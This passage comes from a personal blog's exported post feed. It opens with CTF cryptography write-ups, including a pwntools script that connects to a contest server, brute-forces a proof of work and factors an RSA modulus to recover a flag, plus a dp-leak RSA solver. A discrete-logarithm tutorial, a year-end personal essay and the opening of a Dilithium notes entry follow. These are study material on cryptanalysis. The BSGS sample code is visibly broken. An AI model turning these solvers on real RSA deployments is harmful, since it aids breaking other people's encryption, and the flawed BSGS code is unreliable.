<p>然后就拿到了一个线性方程，其中c的系数是1500+位的，z是1040位数，c可以自己构造，这里为了让c尽可能大所以选择m1=n-1。</p>
<p>现在要做的是分解n，所以两边同除c，那么右边剩下1500位+16位，测试后发现<span class="math display">\[\sqrt{x+y}{3}=p+q-1\]</span>，那么就得到了p+q的值，再利用<span class="math display">\[p-q=\sqrt{(p+q)^2-4n}{2}\]</span>就可以分解pq了。</p>
<p>最后<span class="math display">\[ccc=(x+y)flag^e+z\]</span>因为x+y的位数大于z，所以两边整除x+y即可获得flag加密后的值，最后解出flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> gmtime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dehash</span>(<span class="params">s,re</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s,re)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=a+b+c+d+s</span><br><span class="line">                    <span class="keyword">if</span>  sha256(ss.encode()).hexdigest()==re:</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpq</span>(<span class="params">c,n</span>):</span><br><span class="line">    c1=gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]+<span class="number">1</span><span class="comment">#c1=p+q</span></span><br><span class="line">    c2=gmpy2.iroot(c1**<span class="number">2</span>-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (c1+c2)//<span class="number">2</span>,(c1-c2)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">    p=remote(<span class="string">&#x27;47.104.85.225&#x27;</span>,<span class="number">49877</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;SHA-256(?+&quot;</span>)</span><br><span class="line">    s=p.recvuntil(<span class="string">&quot;) == &quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    hashre=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    p.sendline(dehash(s.decode(),hashre.decode()))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;n = &#x27;</span>)</span><br><span class="line">    n=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;e = &#x27;</span>)</span><br><span class="line">    e=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    message=n-<span class="number">1</span></span><br><span class="line">    p.sendline(long_to_bytes(message))</span><br><span class="line">    p.recvline()</span><br><span class="line">    cc=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line">    p0,q0=getpq(cc//message,n)</span><br><span class="line">    <span class="keyword">assert</span> p0*q0==n</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">    ccc=p.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    ccc=<span class="built_in">int</span>(ccc)</span><br><span class="line">    </span><br><span class="line">    x=p0**<span class="number">2</span> * (p0 + <span class="number">3</span>*q0 - <span class="number">1</span> ) + q0**<span class="number">2</span> * (q0 + <span class="number">3</span>*p0 - <span class="number">1</span>) </span><br><span class="line">    y=<span class="number">2</span>*p0*q0 + p0 + q0</span><br><span class="line">    flag=ccc//(x+y)</span><br><span class="line">    phi=(p0-<span class="number">1</span>)*(q0-<span class="number">1</span>)</span><br><span class="line">    d=gmpy2.invert(e,phi)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(flag,d,n)))</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="random_rsa">Random_RSA</h1>
<p>题目分成两部分，前半部分是RSA的dp、c、n模式，后半部分是生成种子后生成伪随机数，再通过Feistal网络加密dp。</p>
<p>这一题要使用py2来解伪随机数，获取dp后在(1,e)爆破i满足<span class="math display">\[(dp⋅e−1)%i==0(dp⋅e−1)%i==0和n%((dp⋅e−1)//i+1)==0时n%((dp⋅e−1)//i+1)==0时\]</span>，N成功分解，证明在大佬的博客里有。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> encoders</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">e, dp, n</span>):</span><br><span class="line">    _ = dp * e - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _ % i:</span><br><span class="line">            p = _ // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> n % p:</span><br><span class="line">                q = n // p</span><br><span class="line">                phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">n=<span class="number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line">ct=<span class="number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">seeds=[<span class="number">4827</span>, <span class="number">9522</span>, <span class="number">552</span>, <span class="number">880</span>, <span class="number">7467</span>, <span class="number">7742</span>, <span class="number">9425</span>, <span class="number">4803</span>, <span class="number">6146</span>, <span class="number">4366</span>, <span class="number">1126</span>, <span class="number">4707</span>, <span class="number">1138</span>, <span class="number">2367</span>, <span class="number">1081</span>, <span class="number">5577</span>, <span class="number">4592</span>, <span class="number">5897</span>, <span class="number">4565</span>, <span class="number">2012</span>, <span class="number">2700</span>, <span class="number">1331</span>, <span class="number">9638</span>, <span class="number">7741</span>, <span class="number">50</span>, <span class="number">824</span>, <span class="number">8321</span>, <span class="number">7411</span>, <span class="number">6145</span>, <span class="number">1271</span>, <span class="number">7637</span>, <span class="number">5481</span>, <span class="number">8474</span>, <span class="number">2085</span>, <span class="number">2421</span>, <span class="number">590</span>, <span class="number">7733</span>, <span class="number">9427</span>, <span class="number">3278</span>, <span class="number">5361</span>, <span class="number">1284</span>, <span class="number">2280</span>, <span class="number">7001</span>, <span class="number">8573</span>, <span class="number">5494</span>, <span class="number">7431</span>, <span class="number">2765</span>, <span class="number">827</span>, <span class="number">102</span>, <span class="number">1419</span>, <span class="number">6528</span>, <span class="number">735</span>, <span class="number">5653</span>, <span class="number">109</span>, <span class="number">4158</span>, <span class="number">5877</span>, <span class="number">5975</span>, <span class="number">1527</span>, <span class="number">3027</span>, <span class="number">9776</span>, <span class="number">5263</span>, <span class="number">5211</span>, <span class="number">1293</span>, <span class="number">5976</span>, <span class="number">7759</span>, <span class="number">3268</span>, <span class="number">1893</span>, <span class="number">6546</span>, <span class="number">4684</span>, <span class="number">419</span>, <span class="number">8334</span>, <span class="number">7621</span>, <span class="number">1649</span>, <span class="number">6840</span>, <span class="number">2975</span>, <span class="number">8605</span>, <span class="number">5714</span>, <span class="number">2709</span>, <span class="number">1109</span>, <span class="number">358</span>, <span class="number">2858</span>, <span class="number">6868</span>, <span class="number">2442</span>, <span class="number">8431</span>, <span class="number">8316</span>, <span class="number">5446</span>, <span class="number">9356</span>, <span class="number">2817</span>, <span class="number">2941</span>, <span class="number">3177</span>, <span class="number">7388</span>, <span class="number">4149</span>, <span class="number">4634</span>, <span class="number">4316</span>, <span class="number">5377</span>, <span class="number">4327</span>, <span class="number">1774</span>, <span class="number">6613</span>, <span class="number">5728</span>, <span class="number">1751</span>, <span class="number">8478</span>, <span class="number">3132</span>, <span class="number">4680</span>, <span class="number">3308</span>, <span class="number">9769</span>, <span class="number">8341</span>, <span class="number">1627</span>, <span class="number">3501</span>, <span class="number">1046</span>, <span class="number">2609</span>, <span class="number">7190</span>, <span class="number">5706</span>, <span class="number">3627</span>, <span class="number">8867</span>, <span class="number">2458</span>, <span class="number">607</span>, <span class="number">642</span>, <span class="number">5436</span>, <span class="number">6355</span>, <span class="number">6326</span>, <span class="number">1481</span>, <span class="number">9887</span>, <span class="number">205</span>, <span class="number">5511</span>, <span class="number">537</span>, <span class="number">8576</span>, <span class="number">6376</span>, <span class="number">3619</span>, <span class="number">6609</span>, <span class="number">8473</span>, <span class="number">2139</span>, <span class="number">3889</span>, <span class="number">1309</span>, <span class="number">9878</span>, <span class="number">2182</span>, <span class="number">8572</span>, <span class="number">9275</span>, <span class="number">5235</span>, <span class="number">6989</span>, <span class="number">6592</span>, <span class="number">4618</span>, <span class="number">7883</span>, <span class="number">5702</span>, <span class="number">3999</span>, <span class="number">925</span>, <span class="number">2419</span>, <span class="number">7838</span>, <span class="number">3073</span>, <span class="number">488</span>, <span class="number">21</span>, <span class="number">3280</span>, <span class="number">9915</span>, <span class="number">3672</span>, <span class="number">579</span>]</span><br><span class="line"></span><br><span class="line">res=[<span class="number">55</span>,<span class="number">5</span>,<span class="number">183</span>,<span class="number">192</span>,<span class="number">103</span>, <span class="number">32</span>, <span class="number">211</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">120</span>, <span class="number">118</span>, <span class="number">54</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">185</span>, <span class="number">254</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">54</span>, <span class="number">193</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">244</span>, <span class="number">190</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">27</span>, <span class="number">138</span>, <span class="number">42</span>, <span class="number">89</span>, <span class="number">158</span>, <span class="number">254</span>, <span class="number">159</span>, <span class="number">133</span>, <span class="number">78</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">163</span>, <span class="number">145</span>, <span class="number">248</span>, <span class="number">14</span>, <span class="number">179</span>, <span class="number">23</span>, <span class="number">226</span>, <span class="number">220</span>, <span class="number">201</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">195</span>, <span class="number">75</span>, <span class="number">191</span>, <span class="number">237</span>, <span class="number">108</span>, <span class="number">141</span>, <span class="number">141</span>, <span class="number">185</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">242</span>, <span class="number">21</span>, <span class="number">143</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">146</span>, <span class="number">119</span>, <span class="number">173</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">193</span>, <span class="number">173</span>, <span class="number">2</span>, <span class="number">224</span>, <span class="number">205</span>, <span class="number">68</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">205</span>, <span class="number">108</span>, <span class="number">28</span>, <span class="number">243</span>, <span class="number">80</span>, <span class="number">140</span>, <span class="number">4</span>, <span class="number">98</span>, <span class="number">76</span>, <span class="number">217</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">202</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">124</span>, <span class="number">10</span>, <span class="number">168</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">152</span>, <span class="number">48</span>, <span class="number">152</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">190</span>, <span class="number">202</span>, <span class="number">136</span>, <span class="number">204</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">196</span>, <span class="number">219</span>, <span class="number">71</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">173</span>, <span class="number">19</span>, <span class="number">201</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">85</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">59</span>, <span class="number">186</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">147</span>, <span class="number">219</span>, <span class="number">22</span>, <span class="number">81</span>]</span><br><span class="line">dp=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#rands=[[2, 58, 53, 122], [145, 54, 124, 244], [5, 19, 128, 192], [255, 23, 64, 242], [87, 57, 113, 194], [246, 16, 205, 162], [112, 87, 228, 95], [215, 147, 105, 64], [84, 16, 131, 38], [234, 78, 36, 46], [68, 61, 71, 146], [148, 61, 9, 0], [73, 139, 77, 32], [96, 160, 56, 160], [121, 76, 128, 17], [114, 246, 92, 200], [124, 178, 206, 60], [168, 165, 147, 26], [168, 41, 114, 68], [24, 93, 84, 2], [241, 175, 43, 88], [147, 124, 97, 153], [42, 94, 118, 45], [150, 103, 127, 52], [127, 68, 163, 62], [165, 193, 37, 89], [219, 248, 142, 59], [241, 182, 8, 35], [230, 140, 211, 146], [88, 138, 226, 2], [48, 150, 5, 56], [87, 109, 255, 135], [40, 227, 216, 65], [23, 188, 190, 10], [5, 25, 28, 64], [6, 12, 124, 108], [167, 53, 113, 124], [255, 207, 192, 158], [61, 239, 166, 5], [62, 108, 86, 181], [127, 123, 44, 64], [195, 51, 192, 30], [30, 82, 168, 95], [56, 178, 165, 146], [168, 68, 77, 239], [106, 204, 247, 226], [17, 46, 62, 114], [91, 71, 156, 134], [37, 157, 43, 182], [146, 219, 6, 42], [148, 143, 234, 161], [108, 33, 139, 255], [50, 139, 169, 157], [71, 117, 140, 25], [28, 153, 194, 26], [241, 221, 235, 243], [124, 28, 131, 141], [159, 137, 111, 184], [47, 206, 221, 11], [220, 152, 157, 88], [188, 41, 213, 97], [4, 191, 220, 10], [77, 13, 143, 248], [94, 140, 110, 122], [49, 25, 250, 226], [218, 64, 102, 109], [189, 238, 143, 66], [91, 18, 131, 8], [190, 23, 239, 190], [159, 184, 33, 72], [183, 78, 85, 208], [209, 213, 101, 102], [236, 111, 50, 220], [166, 196, 104, 233], [170, 144, 34, 10], [187, 87, 175, 183], [207, 195, 59, 104], [165, 157, 179, 179], [99, 247, 160, 153], [195, 61, 100, 79], [153, 223, 159, 165], [230, 202, 93, 184], [87, 28, 184, 35], [35, 122, 38, 244], [157, 158, 188, 163], [229, 48, 192, 222], [12, 12, 211, 192], [207, 95, 224, 255], [113, 127, 113, 137], [22, 58, 114, 143], [13, 45, 117, 144], [70, 140, 211, 131], [33, 57, 101, 42], [132, 36, 62, 129], [40, 128, 246, 124], [1, 132, 161, 250], [85, 164, 33, 133], [252, 41, 201, 32], [8, 18, 203, 247], [1, 88, 55, 101], [189, 201, 135, 186], [101, 50, 254, 125], [236, 196, 81, 39], [148, 24, 103, 127], [233, 101, 29, 253], [97, 114, 156, 64], [90, 103, 233, 91], [50, 48, 80, 251], [118, 206, 22, 93], [11, 137, 114, 174], [61, 132, 76, 247], [215, 32, 232, 61], [158, 95, 128, 90], [57, 144, 35, 228], [163, 143, 233, 107], [178, 250, 28, 80], [169, 64, 107, 225], [106, 174, 115, 207], [85, 134, 1, 21], [118, 201, 76, 172], [4, 234, 34, 22], [241, 176, 236, 122], [111, 185, 137, 127], [1, 26, 164, 255], [186, 254, 57, 117], [243, 244, 27, 32], [161, 88, 28, 80], [50, 165, 93, 17], [12, 87, 182, 216], [184, 55, 159, 63], [167, 166, 246, 123], [37, 78, 33, 235], [127, 186, 81, 58], [48, 167, 3, 239], [70, 186, 114, 13], [56, 108, 178, 154], [151, 54, 55, 235], [105, 235, 180, 105], [16, 194, 155, 98], [136, 11, 41, 39], [252, 18, 203, 79], [185, 83, 114, 170], [148, 181, 87, 223], [118, 57, 160, 97], [255, 23, 250, 181], [235, 47, 219, 228], [106, 253, 14, 44], [44, 151, 38, 143], [28, 185, 224, 134], [42, 176, 162, 122], [3, 9, 164, 158], [129, 245, 2, 235], [35, 66, 241, 92], [80, 102, 124, 36]]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rand=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        rand.append(random.randint)</span><br><span class="line">    dp+=<span class="built_in">chr</span>(res[i]^rand[i%<span class="number">4</span>]).encode()</span><br><span class="line">dp=<span class="built_in">int</span>(dp)</span><br><span class="line">d=decrypt(e,dp,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ct,d,n)))</span><br></pre></td></tr></table></figure>
<h1 id="share-secret">share secret</h1>
<p>...</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>random</tag>
        <tag>paillier</tag>
      </tags>
  </entry>
  <entry>
    <title>离散对数</title>
    <url>/2021/08/31/2021/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/</url>
    <content><![CDATA[<p>离散对数(Discretelogarithm,简称DL)是一种基于同余运算和原根的一种对数运算。</p>
<span id="more"></span>
<h1 id="基本定义">基本定义</h1>
<p>在群 G 中，g 为 G 的生成元，也就是说群 G 中每一个元素都可以写成 <span class="math display">\[y=g^k \]</span>，我们称 k 为 y 在群 G
中的对数，记作 <span class="math display">\[k=log_yg \]</span>。 <span class="math display">\[
设 m≥1，(a,m)=1 ，使得 a^d≡1(mod\;m)
成立的最小正整数 d\\ 称为 a 对模 m 的指数或者阶，我们一般将其记为
\delta_m(a)
。
\]</span></p>
<p><span class="math display">\[
当
δ_m(a)=φ(m)
时，称 a 是模 m 的原根，简称 m 的原根。
\]</span></p>
<h1 id="性质">性质</h1>
<p><span class="math display">\[
使得
a
^d
≡
1
(
mod\;
m
)
成立的最小正整数
d
，满足
d
∣
φ
(
m
)
。
\]</span></p>
<p><span class="math display">\[
模
m
剩余系存在原根的充要条件是
m
=
2
,
4
,
p^
α
,
2
p^
α
，其中
p
为奇素数，
α
为正整数。
\]</span></p>
<h1 id="离散对数问题">离散对数问题</h1>
<h2 id="爆破">爆破</h2>
<p>给定<span class="math display">\[y≡g^x\;mod\;p\]</span>，<del>不</del>可以暴力枚举x来求解。（误</p>
<h2 id="bsgs">BSGS</h2>
<p>全称是Baby-step
giant-step，也叫小步大步法，使用了中间相遇的思想。</p>
<p>令<span class="math display">\[x=im+j，其中m=[\sqrt
n]\]</span>，i和j都在0到m的范围内</p>
<p>因此<span class="math display">\[y=g^x=g^{im+j}\]</span></p>
<p>变换得<span class="math display">\[y(g^{-m})^i=g^j\]</span></p>
<p>之后我们就可以枚举所所有的j计算，并存在一i个集合S中，然后我们再次枚举i计算<span class="math display">\[y(g^{-m})^i\]</span>,只要发现计算的结果在S中则说明完成碰撞，得到了i和j。</p>
<p>BSGS是一个时间与空间的折中的方式，我们将一个 <span class="math display">\[O(n)\]</span>的时间复杂度，<span class="math display">\[O(1)\]</span> 空间复杂度的算法转换为了一个<span class="math display">\[O(\sqrt n)\]</span> 的时间复杂度和<span class="math display">\[O(\sqrt n)\]</span> 的空间复杂度的算法。</p>
<p>其中</p>
<ol type="1">
<li>j每次增加表示“baby-step”</li>
<li>i每次增加表示"giant-step"</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">g,y,p,bound</span>):</span><br><span class="line">    m=gmpy2.iroot(bound,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    S=&#123;<span class="built_in">pow</span>(g,j,p):j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m)&#125;</span><br><span class="line">    gs=<span class="built_in">pow</span>(g,-m,p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)：</span><br><span class="line">    	<span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> i*m+S[y]</span><br><span class="line">        y=y * gs %p</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">g=</span><br><span class="line">y=</span><br><span class="line">p=</span><br><span class="line">bound=</span><br><span class="line">x=bsgs(g,y,p,bound)</span><br></pre></td></tr></table></figure>
<p>sagemath内置函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line">bsgs(g,y,bounds,operation)</span><br></pre></td></tr></table></figure>
<h2 id="pollards-rho-algorithm">Pollard‘s Rho algorithm</h2>
<p>Pollard’s Rho
算法是一个非常有趣又容易理解的整数因子分解算法，原本用于分解RSA体系中的n，后来又应用于离散对数问题。</p>
<h1 id="加密算法">加密算法</h1>
<h2 id="elgamal-pkc">Elgamal PKC</h2>
<p>老规矩，Alice传消息给Bob： <span class="math display">\[
公开：大质数p和F^*_p下的生成元g\\
1.Alice随机选择一个密钥a，计算A=g^a\;mod\;p,并将公钥A传给Bob（g和p其实也是公钥）\\
2.Bob生成随机数k，计算c_1=g^k\;mod\;p,c_2=mA^k\;mod\;p\\
3.Alice还原m：
(c^a)^{-1}*c_2=(g^{ak})^{-1}*m(A^k)=(g^{ak})^{-1}*mg^{ak}=m\;mod\;p
\]</span> <img src="/images/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/image-20210906171507054.png" alt="image-20210906171507054"></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>离散对数</tag>
      </tags>
  </entry>
  <entry>
    <title>石卡库的2023</title>
    <url>/2024/01/05/2023/2023/</url>
    <content><![CDATA[<p>迟来的年终总结 : p</p>
<span id="more"></span>
<p>夕时难觅朝花，回过头来，2022一眨眼就过去了，2023仿佛也是如此，距离上次写反思都可以追溯到<a href="https://sh1k4ku.github.io/2021/12/31/2021/2021-end/?highlight=2021">2021</a>。由于对世界的认知不够，加上疫情这团乌云笼罩，自己在很长一段时间陷入了严重的虚无主义，没有动力，看不清脚下的路，这也是22年没有进行写作的原因吧，老实说，22年给我留下的印象着实很少，在年末有思考到要改变，后来23年开始有转机，真正感觉到自己在活着，热烈的活着</p>
<h1 id="比赛">比赛</h1>
<p>早在21年的总结中就提到了CTF终究只是个游戏，虽然也有相关的工作岗位，但自己肯定做不到靠这个谋生，于是这一年也开始慢慢退出比赛了。不过作为前队长偶尔还会帮学弟打一打，大多都是些无聊的题目，有价值的内容比较少，像年底的强网杯1515，有价值的地方在于23年ducas的美密，能从这一篇paper去学习zshape
lattice，但对做题来说，改改开源代码就能解决</p>
<p>还有和<a href="https://yijiujiuqinianwoxuehuilekaiqiche.github.io/">一九九七年</a>的Crypto
CTF第六名，是今年最有热情的一次比赛了吧233333。我们还有个啥比网站，https://yijiujiuqinianwoxuehuilekaiqiche.github.io/，哈哈哈哈哈哈哈哈哈</p>
<h1 id="升学科研">升学&amp;科研</h1>
<p>由于要升学，在中国人眼中这是比较重要的一年了吧：属于你国特有的焦虑。但是一想到要给很多老师投简历，并且给每一位老师都表明自己很想去他那，就会嫌麻烦起来，这实在与我的价值观不符。于是最后只去了交大的夏令营，预推免也没有再去其他地方（因为武大线上所以还报了武大的预推免，但最后928那天系统里压根没有填写武大的志愿，给武大老师磕了）。</p>
<p>这中间还有一些有意思的细节：原本自己想的是上岸不了交大，大不了后面gap一下出国，所以也没考虑其他地方，从7月就去上海实习了。但自己太菜了，夏令营机试考ACM做的巨烂，导致排名很低，和一些朋友说了这个事儿。到这里还一切正常，但是Nairw这个臭猪每隔两天就给我发一句“出结果没“
or
"录取了没"，导致后面焦虑到爆炸，真坏啊xjw。最终自己的狗运来了，成功上岸。</p>
<p>-----------------------------------我是分割线---------------------------------------------</p>
<p>今年开始初次接触科研，做的安全方面，不是密码学。个人感觉安全的话就是啥都看点，密码学更偏数学一点，都挺有意思。这段实习经历也很有趣，学了很多之前没接触过的领域，认识了很多有意思的人。科研是啥样目前也说不出个所以然来，大概就是读论文、找问题、解决问题？当然，因为自己太菜了还没有成果，希望明年可以搞出一点东西来~~</p>
<h1 id="阅读">阅读</h1>
<p>前两年都没怎么看过书，但是22年开始健身后，有一个健身搭子很喜欢阅读，每次路上就是在聊书，勾起了👴的兴趣，今年开始把读书捡起来，看了六本书：</p>
<ul>
<li>《芥川龙之介的28篇短篇小说》（这其实不是书名），原本是冲着《罗生门》（针对同一件事的不同立场使得故事模糊不清）去看的，后来也读到几篇比较有意思的，比如《山药粥》（欲望实现的空虚）、《河童》（不记得讲啥了）</li>
<li>《金榜题名之后：大学生出路分化之谜》，跟风看，采访了顶尖大学的学生，以及持续跟进他们的人生出路，个人感觉和各个高校学生自发组织撰写的《学生自救手册》类似，都是能引起思考的作品</li>
<li>《西线无战事》，反战题材的作品，让我一度很沉迷一战的前因后果</li>
<li>《安德的游戏》，一直很想看的科幻小说，主线是人类去进攻外星人，不过还穿插了很多有关社会、政治的内容</li>
<li>《爱因斯坦的梦》，也是跟风看的，纯意识流</li>
<li>《堂吉诃德》，好，名著</li>
</ul>
<h1 id="旅行">旅行</h1>
<p>疫情终于结束了！23年狠狠的到处逛，没做到读万卷书咱也得做到行万里路。</p>
<p>3月去杭州参加了西湖论剑的决赛，和V、lord面基了，逛了西湖灵隐寺啥的</p>
<p>5月去了重庆玩，人好多TvT，卤校长火锅可以的，还在白象居拍了照片！</p>
<p>6月底去上海实习了半年，一直待到了年底</p>
<p>9月找了个周末去南京瞎逛，有懒狗嫌人多哪都不肯去，我不说是谁，不过跟着本地人一路吃吃喝喝也不错</p>
<p>国庆和春哥、任佬、辉哥在山东玩了一圈，济南淄博青岛，山东烧烤和海都挺不错的</p>
<p>12月前后买了台相机，开始尝试摄影！</p>
<p>12月回学校前又去了趟山东，威海+烟台，看看雪和海景</p>
<p>年底前去西安，和dbt 春哥
tolin开车去兵马俑和华清池，原本准备在钟楼跨年但是没活动了，晚上回住的地方喝酒吹牛比（<sup>-</sup>)</p>
<h1 id="石卡库弃坑的内容">石卡库弃坑的内容</h1>
<p>这个专栏的起因是被1997年的哥们逮住我开的坑《introduction to modern
cryptography》压根没写，被狠狠的网暴了😅</p>
<p><img src="/images/2023/qq_pic_merged_1704642375877.jpg" alt="qq_pic_merged_1704642375877" style="zoom: 25%;"></p>
<p>本来读了前三章准备写点，后面被叫去看PQC，于是就咕咕了😭😭</p>
<p>嗯，所以感觉总结一下没填的坑也是有意义的</p>
<ol type="1">
<li>上面提到的基础书</li>
<li>23年后半年做的东西还需要强化一下，虽然目前没什么头绪，还是要提上日程</li>
<li>其实库里还攒了一堆论文没看</li>
<li>说好的学同源曲线也咕咕了</li>
<li>去了上海后健身也咕咕了</li>
<li>应该还是有的，但我没想起来，所以放个在这</li>
</ol>
<h1 id="致2024">致2024</h1>
<p>2023比2022强太多了，扫清过去的阴霾，希望2024可以</p>
<ol type="1">
<li>静下心来读论文，多调代码，尤其是现在有各种lattice分析的idea、bkz的优化（g6k）</li>
<li>拓展自己的技能点，除了密码外学点别的领域</li>
<li>保持自己的兴趣爱好；说实话，感觉自己的爱好太多，应该先做好事业才对</li>
<li>有想法搭一个自己的摄影网站0.0</li>
<li>想去日本玩一趟</li>
<li>...</li>
</ol>
]]></content>
      <categories>
        <category>life</category>
      </categories>
  </entry>
  <entry>
    <title>Learning record of Dilithium</title>
    <url>/2023/11/15/2023/Learning-record-of-Dilithium/</url>
    <content><![CDATA[<p>Dilithium</p>
<span id="more"></span>
<table>
<colgroup>
<col style="width: 51%">
<col style="width: 28%">
<col style="width: 20%">
</colgroup>
<thead>
<tr>
<th>paper</th>
<th>义眼顶真</th>
<th>读后感</th>
</tr>
</thead>
